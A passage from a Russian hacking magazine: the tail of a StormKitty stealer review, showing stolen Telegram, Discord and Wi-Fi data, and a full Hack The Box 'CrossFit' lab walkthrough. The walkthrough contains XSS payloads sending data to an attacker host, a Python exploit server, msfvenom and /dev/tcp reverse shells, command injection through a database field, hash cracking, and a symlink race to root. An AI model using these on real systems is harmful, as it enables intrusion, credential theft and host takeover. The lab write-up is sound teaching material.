репозитории с GitHub, — вот ценность‐то!
  Короче, граббер оказался бес полезным. До диска D он вообще не доб‐
рался, вопреки заявлениям автора, что он весь комп перероет и вытащит все
ценное. Логика работы по мень шей мере странная, и даже в тепличных усло‐
виях ничего ценного (и даже явно попадающего под фильтр) не нашлось.
  В папке Messenger должно быть самое интересное. Внутри у меня наш‐
лось две подпапки — Telegram и Discord. В папке с «телегой» находит‐
ся 16 файлов, подставив которые к голому бинарнику Telegram в папку tdata
я смог зайти в свою сес сию без лишних подтверждений.


             INFO

                      Пот ребовался,   конечно,   локальный   пароль,
                      но сбрутить четыре цифры офлайн — дело пле‐
                       вое.


Информация о Discord включает в себя токен (все обнаруженные токены
заботливо складываются в файлик tokens.txt) и копию сессионных файлов.
Ничего запредельного.
  Последней на сцене появляется пап ка System, в которой ожидаемо
содержится общая информация о целевом компьютере. В список таких дан‐
ных входит скриншот экра на (правда, только главного: второй мой монитор
на скриншот не попал), список про цес сов, ключ активации Windows, список
сохраненных и доступных сетей Wi‐Fi, а также список активных при ложе ний.
  В списке процессов есть PID и путь к бинарнику, но почему‐то нет аргу‐
ментов запуска. Странно.


NAME: svchost
    PID: 816
    EXE: C:\Windows\system32\svchost.exe


NAME: iCUE
    PID: 1728
    EXE: C:\Program Files (x86)\Corsair\CORSAIR iCUE
Software\iCUE.exe


NAME: RuntimeBroker
    PID: 5984
    EXE: C:\Windows\System32\RuntimeBroker.exe


NAME: Typora
    PID: 2104
    EXE: C:\Program Files\Typora\typora.exe
...

Список сохраненных сетей тоже не очень раду ет: для откры тых сетей вместо
пароля указано 65001.


PROFILE: test‐open‐net
PASSWORD: 65001


PROFILE: TP‐LINK_****
PASSWORD: 28408284


PROFILE: ZTE‐8*****
PASSWORD: cc1*****
...

Впрочем, вывод сле дующего дампа проясняет это поведение: если сеть
открытая, вместо пароля будет вытащено 65001 из первой строки — Active
code page: 65001. Кста ти, вывод списка доступных сетей выглядит неплохо:


Active code page: 65001


Interface name : Wi‐Fi
There are 2 networks currently visible.


SSID 1 : Ext
    Network type            : Infrastructure
    Authentication          : WPA2‐Personal
    Encryption              : CCMP
    BSSID 1                 : b0:4e:**:**:**:**
         Signal             : 99%
         Radio type         : 802.11n
         Channel            : 6
         Basic rates (Mbps) : 1 2 5.5 11
         Other rates (Mbps) : 6 9 12 18 24 36 48 54


SSID 2 : ZTE‐8*****
    Network type            : Infrastructure
    Authentication          : WPA2‐Personal
    Encryption              : CCMP
    BSSID 1                 : cc:1a:**:**:**:**
         Signal             : 99%
         Radio type         : 802.11n
         Channel            : 6
         Basic rates (Mbps) : 6.5 16 19.5 117
         Other rates (Mbps) : 18 19.5 24 36 39 48 54 156

Показания сканера, конечно, местами странные, но список сетей и некото‐
рую информацию он показал правиль но. Настоль ко правильно, что часть
даже замазать пришлось.
  И последний файл отчета — список открытых окон. Странно, как некото‐
рые из записей оказались в этом списке, но все откры тые окна были обна‐
ружены точно. Пример записи ниже.


NAME: devenv
    TITLE: StormKitty ‐ Microsoft Visual Studio (Administrator)
    PID: 11868
    EXE: C:\Program Files (x86)\Microsoft Visual Studio\2019\Communi‐
ty\Common7\IDE\devenv.exe


NAME: GitHubDesktop
    TITLE: GitHub Desktop
    PID: 2620
    EXE: C:\Users\Hackcat\AppData\Local\GitHubDesktop\app‐
2.6.6\GitHubDesktop.exe


NAME: Windscribe
    TITLE: Windscribe
    PID: 15260
    EXE: C:\Program Files (x86)\Windscribe\Windscribe.exe
...

Список процессов почти такой же: по сути, добавился только заголовок окна.
Опять же — никакой информа ции об аргу ментах. «Котик» как бы издевается,
не давая нам важный кусок информации.


ЗАКЛЮЧЕНИЕ
Впечатления  оказались  нес колько  противоречивыми,  поэтому  просто
перечислю плюсы и минусы, а ты сам сделаешь вывод, подходит ли тебе
такой вариант.
  Плюсы:
 • собирается без фокусов с первого раза;
 • билд занимает всего несколько сот килобайт;
 • автоматическая обфуска ция;
 • хорошо читается исходник;
 • бесплатный;
 • много возможностей;
 • не нуждается в C&C;
 • котики милые.

Минусы:
 • палится антивирусами (пусть и не всеми);
 • нет возможности управлять зараженными машина ми;
 • некоторые функции работа ют не так, как надо (тот же граббер и извле‐
   чение паролей из Thunderbird);
 • не показывает часть важной информа ции;
 • зависит от .NET 4. Впрочем, .NET легко ста вится даже на Windows XP
   и предустановлен начиная с Windows 7;
 • порой некорректное поведение и откро венно странные решения. Анти‐
   отладка через прямой запрос к WinAPI — выглядит, конечно, надежно!

Плюсов вроде больше, но минусы весьма зна чительные. К тому же часть фун‐
кций проверить не удалось, а фантазировать не хотелось бы. Главное — пом‐
ни, что перед использованием понадобится отклю чить защиту или провес ти
ночь с протекторами, упаковщиками, обфуска торами и прочей нечистью.
ВЗЛОМ

      HTB
CROSSFIT





     РАСКРУЧИВАЕМ СЛОЖНУЮ XSS,
       ЧТОБЫ ЗАХВАТИТЬ ХОСТ





В  этой  статье на примере «безумной»
по  уровню  сложности машины  CrossFit
с  площадки  Hack  The  Box  я  покажу,
как искать XSS на недоступных стра ницах
сайта, сканировать домены через XSS, про‐             RalfHacker                                                                                             hackerralf8@gmail.com
водить разведку на машине с Linux, уда лен‐
но исполнять код, используя FTP, и эксплу‐
атировать  инъекцию  команд  в  поль‐
зовательском приложении. А под конец
немного пореверсим, что бы найти финаль‐
ную уязвимость.


           WARNING

                     Подключаться к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                    жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Адрес машины — 10.10.10.208, добавляем его в /etc/hosts для удобства.


10.10.10.208    crossfit.htb

Сканируем порты. Я, как всегда, использую небольшой скрипт, который
запускает Nmap в два этапа: быстрое общее сканирование и затем сканиро‐
вание со скриптами на обна руженных портах.


#!/bin/bash
ports=$(nmap ‐p‐ ‐‐min‐rate= 500 $1 | grep ^[0‐9] | cut ‐d '/' ‐f 1 |
tr '\n' ',' | sed s/,$//)
nmap ‐p$ports ‐A $1





                    Результат работы скрипта





              Результат работы скрипта (продолжение)

По результатам сканирования имеем три откры тых порта:
 • порт 21 — служба FTP (обра ти внимание на наличие сертификата);
 • порт 22 — служба SSH;
 • порт 80 — веб‐сервер Apache.

На SSH нам ловить нечего, так как там можно разве что брутфорсить учетные
данные, а это последнее дело. Куда интерес нее наличие сертификата у служ‐
бы FTP. Как учат все курсы разведки, из сертифика та можно получить инте‐
ресную информацию. У любого сертифика та есть важное поле Common
Name — доменное имя сервера, для которо го действителен сертификат.
В нашем случае это gym‐club.crossfit.htb.



           Доменное имя, указанное в поле Common Name

Найденное имя мы сразу добавляем в файл /etc/hosts.


10.10.10.208    gym‐club.crossfit.htb


Перебор каталогов
Переходим к веб‐серверу. На 80‐м порте по адресу http://crossfit.htb
нас встречает стартовая страница Apache. А вот по найденному в сертифика‐
те домену http://gym‐club.crossfit.htb открывается сайт тре нажерного
зала.





         Стартовая стра ница Apache по адресу http://crossﬁt.htb





           Пользовательский сайт http://gym‐club.crossﬁt.htb

Одно из первых действий при пентестин ге веб‐приложения — это сканиро‐
вание сайта на наличие интересных катало гов и файлов. Я обычно беру
для этого утилиту gobuster. При запус ке используем следующие параметры:
 • dir — сканирование директорий и файлов;
 • k — не проверять SSL‐сертификат;
 • t [] — количество потоков;
 • u [] — URL‐адрес для ска ниро вания;
 • x  [] — интересу ющие расширения файлов, перечисленные через
   запятую;
 • w [] — сло варь для перебо ра;
 • timeout [] — время ожидания ответа.


gobuster dir ‐t 128 ‐u http://crossfit.htb/ ‐w /usr/share/wordlists/
dirbuster/directory‐list‐lowercase‐2.3‐medium.txt ‐x html,php
‐‐timeout 30s



       Обнаруженные подкаталоги и фай лы на http://crossﬁt.htb


gobuster dir ‐t 128 ‐u http://gym‐club.crossfit.htb/ ‐w /usr/share/
wordlists/dirbuster/directory‐list‐lowercase‐2.3‐medium.txt ‐x html,
php ‐‐timeout 30s





    Обнаруженные подкаталоги и файлы на http://gym‐club.crossﬁt.htb

По результатам сканирования можно сказать, что http://crossfit.htb
интереса больше не представляет. На http://gym‐club.crossfit.htb есть
интересный каталог с вызывающим наз ванием security_threat. В нем —
единственный файл, при обра щении к которо му получаем сообщение, что
доступ к информации огра ничен.





              Содержимое http://gym‐club.crossﬁt.htb


    Обнаруженные подкаталоги и файлы на http://gym‐club.crossﬁt.htb

Пока ничего существенного мы не нашли, но все же получили допол нитель‐
ную информацию.


ТОЧКА ВХОДА
При осмотре сайта находим форму отправки комментариев, которые могут
быть подвержены XSS. Вот только ответ мы не видим, поэтому нужно выпол‐
нить отстук на свой хост. Для этого откроем порт с помощью простого
веб‐сервера на Python, чтобы мы могли отлавливать все обращения.


sudo python3 ‐m http.server 80

И, когда все готово, отпра вим нагрузку, которая должна загрузить удаленный
скрипт на JS.


<script src="http://[локальный IP адрес]/></script>





                 Тестовая нагрузка в поле комментария

В качестве ответа на такой комментарий получаем сообщение об обнаружен‐
ной и заблокированной ата ке XSS!




                 Сообщение о блокировке XSS

Здесь сказано, что наш IP‐адрес и информация о браузе ре будут пре дос‐
тавлены администратору ресурса. Прекрасно! Значит, мы можем поп‐
робовать выполнить XSS, но уже для адми нистратора.
  На источник IP мы повлиять не можем, а вот информацию о браузе ре сер‐
вис узнает из заголовка User‐Agent про токола HTTP. Значение этого
заголовка мы можем подменить хоть в самом бра узере, хоть в специальных
приложениях вроде Burp.
   Стоит помнить, что сооб щение будет дос тавлено только в случае детекта
XSS. То есть нужно отпра вить нагрузку и в поле комментария, и в заголовке
User‐Agent. Я открыл порт 8888 и заменил значение заголовка при помощи
Burp. После отправки запроса получаем отклик в логах нашего веб‐сервера.





        Запрос, содержащий наг рузку XSS в заголовке User‐Agent



    Попытка загрузки скрип та с веб‐сервера локаль ного хос та (отклик)

Это значит, что мы можем выполнить заг рузку удаленного скрипта на JS
и эксплуатировать XSS.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       HTB CROSSFIT
              РАСКРУЧИВАЕМ СЛОЖНУЮ XSS, ЧТОБЫ
                                 ЗАХВАТИТЬ ХОСТ





XSS
Теперь нужно определить ся с вектором ата ки. Помнишь страницу с ограниче‐
нием доступа? От имени администратора мы наверняка сможем ее пос‐
мотреть, а XSS поможет нам в этом. Код страницы мы получим, используя
методы open и send объекта XMLHttpRequest.


var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://gym‐club.crossfit.htb/security_threat/report.
php', true);
xhr.setRequestHeader('Content‐type', 'application/
x‐www‐form‐urlencoded');
xhr.send();

Код запрошенной страницы здесь сохраня ется в переменной xhr.response‐
Text, и его еще нужно передать на наш сервер, чтобы он отобразился
в логах. Значение для сохранения целос тности сна чала закодируем в Base64,
чтобы непечатаемые символы нам не помеша ли. В качес тве  триггера
для отправки будем использовать метод onload объекта XMLHttpRequest.
Полный код выглядит следующим образом.


var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://gym‐club.crossfit.htb/security_threat/report.
php', true);
xhr.setRequestHeader('Content‐type', 'application/
x‐www‐form‐urlencoded');
xhr.onload = function () {
        var request = new XMLHttpRequest();
        request.open('GET', 'http://10.10.14.80:8888/?code=' + btoa(
xhr.responseText), true);
        request.send();
};
xhr.send();

Сохраняем его в файл (у меня evil.js) в директории запущенного веб‐сер‐
вера. После чего повторяем запрос с известной нагрузкой в заголовке User‐
Agent, но уже указываем для загрузки скрипта свой файл.


<script src="http://10.10.14.80:8888/evil.js"></script>

В логах веб‐сервера получа ем информацию: сначала о загрузке скрипта,
а потом обращение к вымышленной стра нице. В качестве аргумента при‐
ходят данные в кодировке Base64, декодируем их.



                  Логи локального веб‐сервера





             Декодирова ние кода стра ницы report.php

К сожалению, ничего интерес ного мы не получаем, так что в этом месте мне
пришлось крепко задумать ся о том, как развивать атаку дальше. В голову
пришла идея проверить доступные с localhost виртуальные хосты. Сканер
для этого придется реализовать самостоятельно.
  Идея состоит в том, что мы будем провоцировать удаленный хост снова
и снова загружать скрипт на JS с нашего локаль ного сервера, но только каж‐
дый раз мы будем возвращать такой скрипт, который вмес то страницы
http://gym‐club.crossfit.htb/security_threat/report.php будет зап‐
рашивать корневую стра ницу на разных поддоменах http://[random].
crossfit.htb.
   Программировать будем на питоне. Нам нужно проверять код ответа —
если он равен 200, значит, виртуальный хост существу ет.
  Сначала пишем стандартную «базу» для сервера.


#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import requests



def run(server_class=HTTPServer, handler_class=EvilServer, port=8888)
:
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    request()
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()


if __name__ == '__main__':
run()

Чтобы избежать кеширования файла при многократном запросе, будем вести
счетчик vhost_number и каждый раз менять имя файла со скриптом на JS.
В качестве словаря используем namelist.txt из набора SecLists.


global vhost_number
vhost_number = 0;


with open("/usr/share/seclists/Discovery/DNS/namelist.txt", "r") as f
:
    global vhosts
vhosts = f.read().split('\n')[:‐1]

Теперь реализуем функцию первоначальной отправки комментария, которая
будет отсылать нагрузку.


def request():
    headers = {'User‐Agent':'<script src="http://10.10.14.80:8888/
evil'+str(vhost_number)+'.js"></script>', 'Referer':'http://gym‐club.
crossfit.htb/blog‐single.php'}
    data = {'name':'ralf','email':'ralf%40ralf.com','phone':'8888',
'message':'%3Cscript+src%3D%22http%3A%2F%2F10.10.14.80%3A8888%2Fevil.
js%22%3E%3C%2Fscript%3E','submit':'submit'}
    requests.post("http://gym‐club.crossfit.htb/blog‐single.php",data
=data,headers=headers)

В классе сервера обра ботаем GET‐зап рос. Если обращение происходит
к evil.js, то вернем скрипт, который будет выполнять обращение к тестиру‐
емому поддомену. Если такой поддомен сущес твует, то он будет передан
в качестве параметра в повторном запросе на наш сервер.


class EvilServer(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response_only(200)
        self.end_headers()


    def do_GET(self):
        global vhost_number
        self._set_response()
        if vhost_number < len(vhosts):
            if self.path == '/evil'+str(vhost_number)+'.js':
                self.wfile.write(eviljs().encode('utf‐8'))
            if 'vhost=' in self.path[:7]:
                print("vhost found: " + self.path[7:])
            request()

Осталось реализовать функцию, которая будет возвращать JS.


def eviljs():
    global vhost_number
    jscode = """var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://XXX.crossfit.htb/', true);
        xhr.setRequestHeader('Content‐type', 'application/
x‐www‐form‐urlencoded');
        xhr.onload = function(){
            var request = new XMLHttpRequest();
            request.open('GET', 'http://10.10.14.80:8888/vhost=XXX',
true);
            request.send();
        };
        xhr.send();""".replace('XXX', vhosts[vhost_number])
    print(str(vhost_number+1)+ "/" + str(len(vhosts)) + " " + vhosts[
vhost_number] + " "*10, end="\r")
    vhost_number += 1
    return jscode

Важные функции я описал, остальной код приводить не стану — если будешь
повторять прохождение, ты без тру да вос создашь его.
   Скрипт работает медленно, но дает результат!





                          Код сервера



                     Результат ска ниро вания

Убедившись, что скрипт работает, я оста новил его и внес изменения,
которые обеспечат нам удобство при работе. Первым делом добавляем фун‐
кцию requestPage с измененной нагрузкой evil.js.


def requestPage():
    headers = {'User‐Agent':'<script src="http://10.10.14.80:8888/
getpage.js"></script>', 'Referer':'http://gym‐club.crossfit.htb/
blog‐single.php'}
    data = {'name':'ralf','email':'ralf%40ralf.com','phone':'8888',
'message':'%3Cscript+src%3D%22http%3A%2F%2F10.10.14.80%3A8888%2Fevil.
js%22%3E%3C%2Fscript%3E','submit':'submit'}
    requests.post("http://gym‐club.crossfit.htb/blog‐single.php",data
=data,headers=headers)

Нагрузка будет запрашивать уже известный нам файл JS для просмотра стра‐
ниц.


def getpagejs(page="http://ftp.crossfit.htb/"):
    return """var xhr = new XMLHttpRequest();
    xhr.open('GET', '""" + page + """', true);
    xhr.setRequestHeader('Content‐type', 'application/
x‐www‐form‐urlencoded');
    xhr.onload = function(){
        var request = new XMLHttpRequest();
        request.open('GET', 'http://10.10.14.80:8888/page=' + btoa(
xhr.responseText), true);
        request.send();
    };
xhr.send();"""

И будем вызывать ее в функции run() вместо request().


def run(server_class=HTTPServer, handler_class=EvilServer, port=8888)
:
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    requestPage()
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()


if __name__ == '__main__':
    run()

Далее я добавил в метод do_GET() обра ботку зап росов getpage.js и page.
Таким образом Base64 будет декодировать ся, что бы мы могли видеть HTML
прямо в браузере (так гораздо удоб нее).


class EvilServer(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response_only(200)
        self.end_headers()


    def do_GET(self):
        global vhost_number
        self._set_response()
        if vhost_number < len(vhosts):
            if self.path == '/evil'+str(vhost_number)+'.js':
                self.wfile.write(eviljs().encode('utf‐8'))
            if 'vhost=' in self.path[:7]:
                print("vhost found: " + self.path[7:])
            if self.path == '/getpage.js':
                self.wfile.write(getpagejs().encode('utf‐8'))
            if 'page=' in self.path[:6]:
                print(base64.b64decode(self.path[6:]).decode())
                with open("page.html", "w") as f:
                    f.write(base64.b64decode(self.path[6:]).decode())
                os.system("firefox page.html")

Все готово, запускаем. Пос ле выполнения это го «эксплоита» получим окно
с кодом страницы и ее представление в браузере.





                          Код сервера





                   Результат выполнения скрипта

Кажется, эта страница поз воляет нам создать пользователя для службы FTP.
Давай перейдем на вкладку Create New Account, для чего в коде изме ним
один адрес.



             Изменение параметра функции getpagejs()





                   Результат выполнения скрипта

Из исходного кода мы получа ем необ ходимые параметры, такие как user‐
name и password. Также узнаем о том, что нужно получать токен, а это придет‐
ся делать тоже с помощью JS. Для выполнения этих операций добавим новую
функцию createuser().


def createuser():
    return """
    var username='ralf'; var password='ralf';
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open('GET', 'http://ftp.crossfit.htb/accounts/create', false)
;
    xhr.setRequestHeader('Content‐type', 'application/
x‐www‐form‐urlencoded');
    xhr.onreadystatechange = function(){
        if(xhr.readyState){
            var request = new XMLHttpRequest();
            request.open('GET', 'http://10.10.14.80:8888/page=' +
btoa(xhr.responseText), false);
            request.send();
        }
    };
    xhr.send();
    var r = /token" value="(.*)"/g
    var token =r.exec(xhr.responseText)[1];
    var params = '_token=' + token + '&username=' + username + '&
pass=' + password + '&submit=submit';
    xhr.open('POST', "http://ftp.crossfit.htb/accounts", false);
    xhr.setRequestHeader('Content‐type', 'application/
x‐www‐form‐urlencoded');
    xhr.send(params);"""

Эта функция возвращает модифицированный код на JS, который первый раз
запрашивает страницу, что бы получить токен, а второй раз отправляет запол‐
ненную форму, тем самым соз давая нового пользователя ralf с паролем
ralf (в моем случае). В методе to_GET изменим вызов getpagejs() на вызов
новой функции createuser(). Пос ле выпол нения скрипта в окне браузера
наблюдаем свежесозданного пользователя.





                   Результат выполнения скрипта


ШЕЛЛ
После создания пользователя для службы FTP попробуем авторизоваться
на сервере. Поскольку там используется SSL, будем использовать клиент lftp.
При подклю чении необ ходимо отключить проверку сертификата.


set ssl:verify‐certificate no
connect crossfit.htb
login ralf





      Подклю чение к служ бе FTP и просмотр содержимого каталога

По именам катало гов легко определить, что это директории веб‐сервера
и соответствующих вир туальных хос тов. Как пос тупать в таких ситуациях, всем
давно известно — разместить свой шелл. В слу чае с PHP можно легко сге‐
нерировать его с помощью MSFvenom со следующими параметрами:
 • p [] — используемая нагрузка (конечно, берем Meterpreter);
 • LHOST=[] — IP‐адрес локального хос та;
 • LPORT=[] — локальный порт;
 • f [] — формат, в котором будет представлена нагрузка.


msfvenom ‐p php/meterpreter_reverse_tcp LHOST=10.10.14.80 LPORT= 4321
‐f raw > r.php
cat r.php | xclip ‐selection clipboard && echo '<?php ' | tr ‐d '\n'
> r.php && xclip ‐selection clipboard ‐o >> r.php





                       Создание нагрузки

И запустим листенер, который будет ждать обратного подключения от наг‐
рузки. Для быстрого запус ка из metasploit используем команду handler
с параметрами, указанными при создании нагрузки.


handler ‐p php/meterpreter_reverse_tcp ‐H 10.10.14.129 ‐P 4321

Осталось загрузить на FTP скрипт и обратиться к нему. Но во время реали‐
зации обнаруживается нюанс: единственная доступная для записи дирек‐
тория — development‐test. Загружаем скрипт в эту директорию командой
put.



                Запуск лис тенера metasploit handler

Обращаться придется к вновь найденной директории, поэтому добавим
в нашу программу еще одну функцию. При этом в методе to_GET изменим
createuser() на getshell(), где выполняется запрос по новому доменному
имени.


def getshell():
    return """
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://development‐test.crossfit.htb/r.php',
false);
xhr.send()"""

После запуска скрипта получаем шелл, о чем свидетельствует терминал
Metasploit. Сразу же нужно проверить, в контексте какого пользовате ля мы
работаем. Для Meterpreter это команда getuid.





       Создание сессии Meterpreter и выполнение команды getuid


ПРОДВИЖЕНИЕ
Первый юзер
Возникает вопрос — что же делать пос ле того, как получил шелл в системе?
Как найти путь, который приведет к повышению привилегий? На этот случай
существуют скрипты PEASS — они есть и для Windows, и для Linux. Скачиваем
скрипт для Linux, переходим в Meterpreter и командой upload загружаем его
на удаленный хост. Получив командную оболочку (команда shell), назначаем
права на исполне ние и выполняем.





                Загрузка и выполнение скрипта LinPEAS

После того как скрипт отра ботает, у нас появляется новая трудная задача —
выбрать информацию, которая приведет к успешно му продвижению. В дан‐
ном случае отметим для себя пользователей, имеющих интерактивную обо‐
лочку и два найденных хеша (скрипт прос то определя ет спе цифическую
структуру строки).



                     Поль зователи с кон солью



       Найденные в разных файлах специфические строки (хеши)

Найден файл adduser_hank.yml — из названия можно сде лать вывод, что
представ ленный хеш — это результат хеширования пароля пользовате ля
hank. С помощью знаменитого hashcat можно не только быс тро ломать хеши
и создавать правила или списки паролей, но и определять тип хеша. В струк‐
туре хеша есть редкая последовательность $6$, которая и определяет тип
хеша, поэтому узнать алго ритм тру да не сос тавит.


hashcat ‐‐example | grep ‐A1 ‐B1 '\$6\$'




               Получение алго ритма хеширования

Нам сообщают, что это SHA‐512 и что, если мы хотим перебирать его, нужно
использовать код режима 1800. Так мы и поступим, а в качестве словаря
с паролями используем зна менитый rockyou.


hashcat ‐a 0 ‐m 1800 hash.txt ./tools/rockyou.txt





                  Взлом найденного хеша SHA‐512

Так как служба SSH активна (не забыва ем о результатах сканирования пор‐
тов), мы подключаемся с найденным паролем и получаем первый флаг.



                      Поль зовательский флаг




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       HTB CROSSFIT
              РАСКРУЧИВАЕМ СЛОЖНУЮ XSS, ЧТОБЫ
                                 ЗАХВАТИТЬ ХОСТ





Второй юзер
Так как мы получили креды нового пользователя, всю разведку на хосте нужно
проводить заново! У нас ведь теперь совершенно другие привилегии, и этот
момент многие упускают.
  Снова выполним LinPEAS и отберем наиболее важную информацию. Что
очень важно, мы получаем записи cron. К тому же пользователь присутству ет
в группе admin, что дает нам пра во читать файлы из директории /etc/pam.
d/.





                          Записи cron





                Файлы, огра ниченные для чтения

Служба cron позволяет запус кать прог раммы на сервере в определенное
время. В данном случае — от имени пользователя isaac выполняется скрипт
на PHP. Конечно же, сразу смотрим код внутри файла.





              Содержимое файла send_updates.php

В этом скрипте происходит перечисление файлов и директории сообщений
($msg_dir). Если файл обнаружен (isFile()), то делается запрос к базе дан‐
ных  ($conn‐>query) для получения зна чений стол бца email из таблицы
users. Каждая возвращенная строка (адрес электронной почты) будет
передана в качестве аргумента утилите mail. В самом конце от имени поль‐
зователя isaac выполняется вот такая команда:


/usr/bin/mail ‐s 'Crossfit Club Newsletter' [ адрес электронной почты]

Так как команда выпол няется в системе, а входными данными можно манипу‐
лировать, то на ум приходит инъ екция команд (command injection). Если мы
сможем разместить любой файл в директории с сообщениями, то произой‐
дет запрос к БД. Также нужно будет подключиться к базе данных и создать
запись, что позволит манипулировать параметром команды mail.
  Подставим в команду выше вот такую нагрузку:


‐E $(bash ‐c 'bash ‐i >& /dev/tcp/10.10.14.17/4321 0>&1')

Полная команда станет такой:


/usr/bin/mail ‐s 'Crossfit Club Newsletter' ‐E $(bash ‐c 'bash ‐i >
& /dev/tcp/10.10.14.17/4321 0>&1')

Сначала будет выполнен код внутри конс трукции $(...), что приведет
к выпол нению реверс‐шелла. Но мы сталкива емся с рядом проблем: как под‐
клю чаться к базе данных и что за директория с сооб щениями.
  Для подключения к базе данных нужны учет ные данные. Но к под клю‐
чаемому файлу db.php дос тупа у нас нет. Най дем в директории веб‐сервера
на FTP подобный файл и поп робуем получить учетные данные из него.





                  Содержимое файла db.php

Одна проблема решена. Дальше нужно вспомнить о праве на чтение файлов,
расположенных в катало ге /etc/pam.d. PAM — это набор подключаемых
модулей, которые отвечают за аутентификацию в системе. По сути, это API,
который операционная система или при ложения могут использовать, чтобы
отправить запросы на проверку подлиннос ти пользователя. А файлы нас тро‐
ек содержатся именно в этой директории.
  Быстренько ищем по ключевым словам и находим учетные данные адми‐
нистратора FTP. Следующей командой мы из всех файлов в директории
выбираем строки, в которых содержится хоть одна из подстрок: pas, pwd,
secr или key, а также исключаем все закомментированные строки (‐v '#').


cat * | grep "pas\|pwd\|secr\|key" | grep ‐v '#'





                    Фильтра ция файлов PAM

Подключимся к FTP от имени админа и найдем директорию messages.


lftp
set ssl:verify‐certificate no
lftp :~> connect crossfit.htb
lftp crossfit.htb:~> login ftpadm





                   Подключение к службе FTP

Выходит, у нас есть и возможность манипулировать данными и в базе, и в
директории сообщений. Запус тим MySQL и пос мотрим, какие есть базы дан‐
ных.


mysql ‐u crossfit ‐poeLoo~y2baeni





                      Список баз данных

Будем  использовать  пользовательскую  базу  crossﬁt,  так  как  informa‐
tion_schema — служебная. В crossﬁt и найдем таблицу users.





                   Список таблиц в базе crossﬁt

Все сходится, поэто му, как и планировали:
 1. Откроем листенер.


   rlwrap nc ‐lvp 4321

 2. Загрузим в директорию сообщений любой файл.



                      Заг рузка файла на FTP‐сервер

  Пишем в таблицу:


   insert into users (id, email) values (9001, "‐ E $(bash ‐c 'bash
   ‐i >& /dev/tcp/10.10.14.17/4321 0>&1')");





                   Создание записи в базе данных

Спустя несколько секунд команда выполнится и мы получим бэкконнект.





                    Получение бэкконнекта

Для  удобства  работы  сгенерируем  ключ SSH  командой  ssh‐keygen
и запишем сгенерированный публичный ключ пользователю в файл ~/.shh/
authorized_keys.





                    Запись публично го ключа

Теперь можем заходить по SSH с использованием закрытого ключа.


                 Авторизо ванный пользователь isaac


РУТ
В этот раз использование LinPEAS ничего интерес ного не показы вает, поэто‐
му посмотрим, есть ли периодически запускаемые в сис теме процессы,
с помощью pspy64. Прос той запуск pspy ничего не дал, поэтому я запус тил
его с параметром ‐f, чтобы отлавливать события файловой системы.


pspy64 ‐f

Вывод получился очень объемный, поэто му я сохранил его в файл и решил
немного отфильтровать. Убираем из лога все упоминания /etc/, поскольку
нас не интересуют сообщения об обра щении к фай лам passwd, shadow
и тому подобным. Также нас не интересу ют файлы PHP, так как с этим уже
работали и тут ничего нового нет. Можно пос мотреть только события, свя зан‐
ные с директорией var, но там нет ничего интерес ного, поэтому ее тоже
исключаем из вывода. Команда wc ‐l покажет количество переданных строк.





                 Фильтра ция строк в файле логов

Теперь события будет прос мотреть удоб ней. Из общего фона использования
библиотек замечаем утилиту dbmsg, которая запус кается раз в минуту.





                      Логи утилиты pspy64





                   Логи запус ка ути литы dbmsg

Загружаем бинарник на локальную машину с помощью команды scp и откры‐
ваем в любом декомпиляторе. Я использовал Hex‐rays IDA Pro.


scp ‐i id_rsa isaac@crossfit.htb:/usr/bin/dbmsg ./

В декомпиляторе переходим к функции main(). После старта программы
сразу проверяются привилегии пользователя (должен быть root) и генератор
псевдослучайных чисел инициализируется текущим временем.





              Декомпилированный код функции main

В функции process_data() про исхо дит подключение к базе данных и счи‐
тывание данных из таблицы messages.





           Декомпилированный код функции process_data

Далее программа читает строки таблицы и про веряет стол бцы (id, name,
email, messages). После чего в директории /var/local/ создает файл с име‐
нем md5(rand() + id), куда записывает зна чения name, messages и email
(именно в этом порядке). Затем выполняется zip, пос ле чего файл удаляется.





      Декомпилированный код функции process_data (продолжение)

Тут‐то и наметился следующий вектор ата ки: мы можем рассчитывать исполь‐
зуемые псевдослучайные числа, а зна чит, и узнать имя файла; к тому же мы
можем контролировать его содержимое, создавая записи в базе данных.
Учитывая, что операции выполняются от имени root, мы можем создать ссыл‐
ку с таким именем, и она будет указывать на файл authorized_keys. Оста‐
нется лишь записать в него SSH‐ключ! Что ж, за дело!
  Сначала  сге нерируем ключи.  Что бы  сэкономить мес то,  используем
ed25519.





                       Генера ция SSH‐ключей

Теперь напишем программу, которая будет генерировать и выводить псев‐
дослучайное число в зависимос ти от текущего времени.


#include <stdio.h>
#include <stdlib.h>
#include <time.h>


int main(){
    srand(time(0));
    printf("%d", rand());
    return 0;
}

А затем компилируем этот код с помощью gcc.


gcc rand_int.c ‐o rand_int.bin

Теперь нужно загрузить бинарь на хост, пос ле чего написать конвейер
для получения имени файла. Так как мы будем создавать сообщение заново,
то id всегда равен единице.




                 Тестирование получения имен файла

Так как запись не просуществу ет в базе долго, будем производить запись
сообщения с ключом и линковку файла одним скриптом:


#/bin/bash
mysql ‐h localhost ‐u crossfit ‐poeLoo~y2baeni ‐Dcrossfit ‐e'insert
into messages (id, name, email,message) values (1, "ssh‐ed25519",
"ralf@ralf‐PC","AAAAC3N.....Pt0xQdJ");'
while true; do ln ‐s /root/.ssh/authorized_keys /var/local/$(echo ‐n
$(./rand_int.bin) 1 | md5sum | cut ‐d " " ‐f 1) 2>/dev/null; done

Выпол няем скрипт и подключаем по SSH c при ватным ключом.



                    Выполнение скрипта



               Получение флага пользователя root

Вот мы и захватили машину CrossFit! Теперь мы имеем над ней полный кон‐
троль.
ВЗЛОМ

ПРЕПАРИРУЕМ
TYPELIBRARY





